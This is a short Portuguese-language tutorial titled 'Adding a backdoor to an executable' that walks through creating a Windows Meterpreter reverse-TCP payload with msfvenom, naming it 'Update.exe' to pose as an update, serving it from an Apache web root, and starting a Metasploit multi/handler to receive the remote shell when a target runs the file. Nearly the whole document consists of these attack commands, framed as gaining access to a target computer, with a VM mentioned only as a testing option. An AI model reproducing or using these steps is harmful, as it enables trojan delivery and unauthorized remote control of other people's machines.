# Adicionando Backdoor em um executável

## Etapas a seguir

1. `msfvenom -p windows/meterpreter/reverse_tcp -a x86 plataform windows -f exe LHOST=000.000.00.0 LPORT=4444 -o Update.exe `

- Esse comando gera um executavel expecifico para windows, passando a arquitetura x86 , o ip tem que ser da maquina que vai se conectar e a porta pode ser qualquer uma !

2. Após isso é necessario copiar o Update.exe para o diretorio `/var/www/html` , `cp Update.exe /var/www/html`

3. Inicie o servidor do apache `service apache2 start`

4. Acesse o `msfconsole`

5. Use o comando `use multi/handler`

6. Depois use o comando `set payload windows/meterpreter/reverse_tcp`

7. set LHOST 123.000.00.0 (o ip da sua maquina)

8. set LPORT 4444 (A porta que você especificou no arquivo Update.exe)

9. Então enfim é só roda o comando `run`

## se o arquivo foi baixado no computador alvo você terá o acesso !

- é possivel testar usando uma vm , no navagador da vm, coloque o seu ip e acesse o caminho do ip /Update.exe , o dowload será feito na vm e ao executar será possível o acesso
